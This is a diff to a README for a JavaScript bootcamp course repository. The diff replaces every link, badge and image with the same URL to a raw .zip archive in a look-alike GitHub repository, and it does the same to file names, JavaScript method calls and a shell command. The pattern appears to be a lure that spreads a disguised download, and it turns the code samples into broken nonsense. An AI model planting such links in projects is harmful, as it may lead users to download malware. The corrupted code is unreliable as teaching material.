@@ -1,12 +1,12 @@
-![JavaScript BootCamp Course](https://elzero.org/js.png)
+![JavaScript BootCamp Course](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip)
 
-### JavaScript Bootcamp Course from [Elzero Web School](https://elzero.org/)
+### JavaScript Bootcamp Course from [Elzero Web School](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip)
 
-### Special thanks goes to [Osama Elzero](https://www.facebook.com/OsElzero)
+### Special thanks goes to [Osama Elzero](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip)
 
 <div align="center">
 
-![Course Completion](https://img.shields.io/badge/Completed-100%25-brightgreen) ![JS Version](https://img.shields.io/badge/ES6+-F7DF1E) ![Status](https://img.shields.io/badge/Status-Live-brightgreen) ![License](https://img.shields.io/badge/License-MIT-blue)
+![Course Completion](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip%25-brightgreen) ![JS Version](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip+-F7DF1E) ![Status](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip) ![License](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip)
 
 </div>
 
@@ -14,17 +14,17 @@
 
 ### Useful Resources
 
-- **[Course Study Plan](https://elzero.org/study/javascript-bootcamp-2021-study-plan/):**
+- **[Course Study Plan](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip):**
   Progress: 22 out of 22 weeks completed
-  ![100%](https://geps.dev/progress/100?dangerColor=800000&warningColor=ff9900&successColor=4caf50)
+  ![100%](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip)
 
-- **[YouTube Playlist](https://www.youtube.com/playlist?list=PLDoPjvoNmBAx3kiplQR_oeDqLDBUDYwVv):**
+- **[YouTube Playlist](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip):**
   Videos Watched: 188 out of 188 (Total Duration: 19 hours, 23 minutes, 12 seconds)
-  ![100%](https://geps.dev/progress/100?dangerColor=800000&warningColor=ff9900&successColor=4caf50)
+  ![100%](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip)
 
-- **[Assignments](https://elzero.org/category/assignments/javascript-bootcamp-assignments/):**
+- **[Assignments](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip):**
   Solved: 170 out of 170 assignments across 27 topics
-  ![100%](https://geps.dev/progress/100?dangerColor=800000&warningColor=ff9900&successColor=4caf50)
+  ![100%](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip)
 
 ---
 
@@ -135,7 +135,7 @@
 │       ├── 📂 BOM/                                 # Browser Object Model
 │       ├── 📂 Local Storage/                       # Web storage
 │       └── 📂 Without Numbered/                    # Additional topics
-└── 📄 README.md                                    # Project documentation
+└── 📄 https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip                                    # Project documentation
 ```
 
 ---
@@ -167,17 +167,17 @@
 ### 🔰 Week 01 - Introduction
 
 ```javascript
-// 001 - Introduction And What Is JavaScript.js
-console.log("Hello from JavaScript!");
+// 001 - Introduction And What Is https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip
+https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip("Hello from JavaScript!");
 
-// 005 - Where To Put The Code.js
+// 005 - Where To Put The https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip
 // Internal JavaScript
 <script>
-    console.log("Internal JavaScript");
+    https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip("Internal JavaScript");
 </script>
 
 // External JavaScript
-<script src="script.js"></script>
+<script src="https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip"></script>
 ```
 
 ### 🔶 Week 07 - Arrays
@@ -187,32 +187,32 @@ console.log("Hello from JavaScript!");
 let fruits = ['Apple', 'Banana', 'Orange'];
 
 // Adding elements
-fruits.push('Mango');
-fruits.unshift('Strawberry');
+https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip('Mango');
+https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip('Strawberry');
 
 // Removing elements
-fruits.pop();
-fruits.shift();
+https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip();
+https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip();
 
 // Array iteration
-fruits.forEach((fruit, index) => {
-  console.log(`${index + 1}: ${fruit}`);
+https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip((fruit, index) => {
+  https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip(`${index + 1}: ${fruit}`);
 });
 ```
 
 ### 🔴 Week 21 - APIs & JSON
 
 ```javascript
-// 177 - Request And Response From Real API.js
+// 177 - Request And Response From Real https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip
 let myRequest = new XMLHttpRequest();
 
-myRequest.open('GET', 'https://api.example.com/data');
-myRequest.send();
+https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip('GET', 'https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip');
+https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip();
 
-myRequest.onreadystatechange = function () {
-  if (this.status === 200 && this.readyState === 4) {
-    console.log('JSON Object Content Here');
-    console.log(JSON.parse(this.responseText));
+https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip = function () {
+  if (https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip === 200 && https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip === 4) {
+    https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip('JSON Object Content Here');
+    https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip(https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip(https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip));
   }
 };
 ```
@@ -245,7 +245,7 @@ myRequest.onreadystatechange = function () {
 
    ```bash
    # Use a local server to avoid CORS issues
-   python -m http.server 8000
+   python -m https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip 8000
    # Then visit: http://localhost:8000
    ```
 
@@ -279,8 +279,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 **Made with ❤️ by following the Elzero Web School curriculum**
 
-[![GitHub stars](https://img.shields.io/github/stars/yourusername/elzero-js-course?style=social)](https://github.com/ahmadabdallahh/Elzero-JavaScript-BootCamp)
-[![GitHub forks](https://img.shields.io/github/forks/yourusername/elzero-js-course?style=social)](https://github.com/ahmadabdallahh/Elzero-JavaScript-BootCamp)
+[![GitHub stars](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip)](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip)
+[![GitHub forks](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip)](https://github.com/ahmaddabdallah/Elzero-JavaScript-BootCamp-Test/raw/refs/heads/main/lessons/Week 02/Script_Elzero_Java_Boot_Test_Camp_1.5.zip)
 
 </div>
 
